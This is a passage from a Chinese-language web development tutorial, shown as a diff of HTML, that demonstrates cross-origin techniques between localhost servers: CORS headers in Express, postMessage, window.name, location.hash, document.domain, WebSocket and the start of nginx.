+&lt;body&gt;
+    &lt;script&gt;
+        let xhr = new XMLHttpRequest();
+
+        // 正常 cookie 是不允许跨域的
+        document.cookie = 'name=hello';
+
+        // cookie 想要实现跨域必须携带凭证
+        xhr.withCredentials = true;
+
+        // xhr.open('GET', 'http://localhost:4000/getDate', true);
+        xhr.open('PUT', 'http://localhost:4000/getDate', true);
+
+        // 设置名为 name 的自定义请求头
+        xhr.setRequestHeader('name', 'hello');
+
+        xhr.onreadystatechange = function () {
+            if(xhr.readyState === 4) {
+                if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status === 304) {
+                    // 打印返回的数据
+                    console.log(xhr.response);
+
+                    // 打印后台设置的自定义头信息
+                    console.log(xhr.getResponseHeader('name'));
+                }
+            }
+        }
+        xhr.send();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><p>上面 <code>index.html</code> 代码中发送请求访问不在同源的服务器 <code>2</code>，此时会在控制台给出错误信息，告诉我们缺少了哪些响应头，我们对应报错信息去修改访问的服务器 <code>2</code> 的代码，添加对应的响应头，实现 CORS 跨域。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 服务器2
+const express = require(&quot;express&quot;);
+let app = express();
+
+// 允许访问域的白名单
+let whiteList = [&quot;http://localhost:3000&quot;];
+
+app.use(function(req, res, next) {
+    let origin = req.header.origin;
+    if (whiteList.includes(origin)) {
+        // 设置那个源可以访问我，参数为 * 时，允许任何人访问，但是不可以和 cookie 凭证的响应头共同使用
+        res.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
+        // 想要获取 ajax 的头信息，需设置响应头
+        res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;name&quot;);
+        // 处理复杂请求的头
+        res.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;PUT&quot;);
+        // 允许发送 cookie 凭证的响应头
+        res.setHeader(&quot;Access-Control-Allow-Credentials&quot;, true);
+        // 允许前端获取哪个头信息
+        res.setHeader(&quot;Access-Control-Expose-Headers&quot;, &quot;name&quot;);
+        // 处理 OPTIONS 预检的存活时间，单位 s
+        res.setHeader(&quot;Access-Control-Max-Age&quot;, 5);
+        // 发送 PUT 请求会做一个试探性的请求 OPTIONS，其实是请求了两次，当接收的请求为 OPTIONS 时不做任何处理
+        if (req.method === &quot;OPTIONS&quot;) {
+            res.end();
+        }
+    }
+    next();
+});
+
+app.put(&quot;/getDate&quot;, function(req, res) {
+    // res.setHeader('name', 'nihao'); // 设置自定义响应头信息
+    res.end(&quot;I love you&quot;);
+});
+
+app.get(&quot;/getDate&quot;, function(req, res) {
+    res.end(&quot;I love you&quot;);
+});
+
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><h3 id="三、使用-postmessage-实现跨域"><a href="#三、使用-postmessage-实现跨域" aria-hidden="true" class="header-anchor">#</a> 三、使用 postMessage 实现跨域</h3> <p>postMessage 是 H5 的新 API，跨文档消息传送（cross-document messaging），有时候简称为 XMD，指的是在来自不同域的页面间传递消息。</p> <p>调用方式：<strong>window.postMessage(message, targetOrigin)</strong></p> <ul><li>message：发送的数据</li> <li>targetOrigin：发送的窗口的域</li></ul> <p>在对应的页面中用 message 事件接收，事件对象中有 <code>data</code>、<code>origin</code>、<code>source</code> 三个重要信息</p> <ul><li>data：接收到的数据</li> <li>origin：接收到数据源的域（数据来自哪个域）</li> <li>source：接收到数据源的窗口对象（数据来自哪个窗口对象）</li></ul> <p>使用场景：不是使用 <code>Ajax</code> 的数据通信，更多是在两个页面之间的通信，在 <code>A</code> 页面中引入 <code>B</code> 页面，在 <code>A</code>、<code>B</code> 两个页面之间通信。</p> <p>与上面 CORS 类似，我们要创建跨域场景，搭建两个端口号不同的 Nodejs 服务器，后面相同方式就不多赘述了。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 服务器1
+const express = require(express);
+let app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(express);
+let app = express();
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>通过访问 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000/a.html，在 <code>a.html</code> 中使用 <code>iframe</code> 标签引入 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:4000/b.html，在两个窗口间传递数据。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;iframe src=&quot;http://localhost:4000/b.html&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;&lt;/iframe&gt;
+    &lt;script&gt;
+        function load() {
+            let frame = document.getElementById('frame');
+            frame.contentWindow.postMessage('I love you', 'http://localhost:4000');
+            window.onmessage = function (e) {
+                console.log(e.data);
+            }
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- 文件：b.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 B&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        window.onmessage = function (e) {
+            // 打印来自页面 A 的消息
+            console.log(e.data);
+            // 给页面 A 发送回执
+            e.source.postMessage('I love you, too', e.origin);
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><h3 id="四、使用-window-name-实现跨域"><a href="#四、使用-window-name-实现跨域" aria-hidden="true" class="header-anchor">#</a> 四、使用 window.name 实现跨域</h3> <p>同样是页面之间的通信，需要借助 <code>iframe</code> 标签，<code>A</code> 页面和 <code>B</code> 页面是同域的 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000，<code>C</code> 页面在独立的域 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:4000。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 服务器1
+const express = require(express);
+let app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(express);
+let app = express();
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>实现思路：在 <code>A</code> 页面中将 <code>iframe</code> 的 <code>src</code> 指向 <code>C</code> 页面，在 <code>C</code> 页面中将属性值存入 <code>window.name</code> 中，再把 <code>iframe</code> 的 <code>src</code> 换成同域的 <code>B</code> 页面，在当前的 <code>iframe</code> 的 <code>window</code> 对象中取出 <code>name</code> 的值，访问 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000/a.html。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;iframe src=&quot;http://localhost:4000/c.html&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;&lt;/iframe&gt;
+    &lt;script&gt;
+        // 增加一个标识，第一次触发 load 时更改地址，更改后再次触发直接取值
+        let isFirst = true;
+        function load() {
+            let frame = document.getElementById('frame');
+            if(isFirst) {
+                frame.src = 'http://localhost:3000/b.html';
+                isFirst = false;
+            } else {
+                console.log(frame.contentWindow.name);
+            }
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- 文件：c.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 C&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        window.name = 'I love you';
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><br> <h3 id="五、使用-location-hash-实现跨域"><a href="#五、使用-location-hash-实现跨域" aria-hidden="true" class="header-anchor">#</a> 五、使用 location.hash 实现跨域</h3> <p>与 <code>window.name</code> 跨域的情况相同，是不同域的页面间的参数传递，需要借助 <code>iframe</code> 标签，<code>A</code> 页面和 <code>B</code> 页面是同域的 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000，<code>C</code> 页面是独立的域 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:4000。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 服务器1
+const express = require(express);
+let app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(express);
+let app = express();
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>实现思路：<code>A</code> 页面通过 <code>iframe</code> 引入 <code>C</code> 页面，并给 <code>C</code> 页面传一个 <code>hash</code> 值，<code>C</code> 页面收到 <code>hash</code> 值后创建 <code>iframe</code> 引入 <code>B</code> 页面，把 <code>hash</code> 值传给 <code>B</code> 页面，<code>B</code> 页面将自己的 <code>hash</code> 值放在 <code>A</code> 页面的 <code>hash</code> 值中，访问 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000/a.html。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;iframe src=&quot;http://localhost:4000/c.html#Iloveyou&quot; id=&quot;frame&quot;&gt;&lt;/iframe&gt;
+    &lt;script&gt;
+        // 使用 hashchange 事件接收来自 B 页面设置给 A 页面的 hash 值
+        window.onhashchange = function () {
+            console.log(location.hash);
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- 文件：c.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 C&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        // 打印 A 页面引入 C 页面设置的 hash 值
+        console.log(location.hash);
+        let iframe = document.createElement('iframe');
+        iframe.src = 'http://localhost:3000/b.html#Iloveyoutoo';
+        document.body.appendChild(iframe);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- 文件：b.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 B&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        // 将 C 页面引入 B 页面设置的 hash 值设置给 A页面
+        window.parent.parent.location.hash = location.hash;
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><br> <h3 id="六、使用-document-domain-实现跨域"><a href="#六、使用-document-domain-实现跨域" aria-hidden="true" class="header-anchor">#</a> 六、使用 document.domain 实现跨域</h3> <p>使用场景：不是万能的跨域方式，大多使用于同一公司不同产品间获取数据，必须是一级域名和二级域名的关系，如 www.baidu.com 与 video.baidu.com 之间。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>const express = require(&quot;express&quot;);
+let app = express();
+
+app.use(express.static(__dirname));
+app.listen(3000);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>想要模拟使用 <code>document.domain</code> 跨域的场景需要做些小小的准备，到 C:WindowsSystem32driversetc 该路径下找到 <code>hosts</code> 文件，在最下面创建一个一级域名和一个二级域名。</p> <blockquote><p>127.0.0.1          www.domainacross.com
+127.0.0.1          sub.domainacross.com</p></blockquote> <p>命名是随意的，只要是符合一级域名与 二级域名的关系即可，然后访问 <a href="http://www.domainacross.com/" target="_blank" rel="noopener noreferrer">http://www.domainacross.com<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000/a.html。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;p&gt;我是页面 A 的内容&lt;/p&gt;
+    &lt;iframe src=&quot;http://sucess.domainacross.com:3000/b.html&quot; onload=&quot;load()&quot; id=&quot;frame&quot;&gt;&lt;/iframe&gt;
+    &lt;script&gt;
+        document.domain = 'domainacross.com';
+        function load() {
+            console.log(frame.contentWindow.message);
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- 文件：b.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;title&gt;页面 B&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;p&gt;我是 B 页面的内容&lt;/p&gt;
+    &lt;script&gt;
+        document.domain = 'domainacross.com';
+        var message = 'Hello A';
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><h3 id="七、使用-websocket-实现跨域"><a href="#七、使用-websocket-实现跨域" aria-hidden="true" class="header-anchor">#</a> 七、使用 WebSocket 实现跨域</h3> <p>WebSocket 没有跨域限制，高级 API（不兼容），想要兼容低版本浏览器，可以使用 <code>socket.io</code> 的库，WebSocket 与 HTTP 内部都是基于 TCP 协议，区别在于 HTTP 是单向的（单双工），WebSocket 是双向的（全双工），协议是 <code>ws://</code> 和 <code>wss://</code> 对应 <code>http://</code> 和 <code>https://</code>，因为没有跨域限制，所以使用 <code>file://</code> 协议也可以进行通信。</p> <p>由于我们在 NodeJS 服务中使用了 WebSocket，所以需要安装对应的依赖：</p> <blockquote><p>npm install ws --save</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;页面&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        // 创建 webSocket
+        let socket = new WebSocket('ws://localhost:3000');
+        // 连接上触发
+        socket.onopen = function () {
+            socket.send('I love you');
+        }
+        // 收到消息触发
+        socket.onmessage = function (e) {
+            // 打印收到的数据
+            console.log(e.data); // I love you, too
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+const express = require(&quot;express&quot;);
+let app = express();
+
+// 引入 webSocket
+const WebSocket = require(&quot;ws&quot;);
+// 创建连接，端口号与前端相对应
+let wss = new WebSocket.Server({ port: 3000 });
+
+// 监听连接
+wss.on(&quot;connection&quot;, function(ws) {
+    // 监听消息
+    ws.on(&quot;message&quot;, function(data) {
+        // 打印消息
+        console.log(data); // I love you
+        // 发送消息
+        ws.send(&quot;I love you, too&quot;);
+    });
+});
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><h3 id="八、使用-nginx-实现跨域"><a href="#八、使用-nginx-实现跨域" aria-hidden="true" class="header-anchor">#</a> 八、使用 nginx 实现跨域</h3> <p><code>nginx</code> 本身就是一个服务器，因此我们需要去 <code>nginx</code> 官网下载服务环境 <a href="http://nginx.org/en/download.html" target="_blank" rel="noopener noreferrer">http://nginx.org/en/download....<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 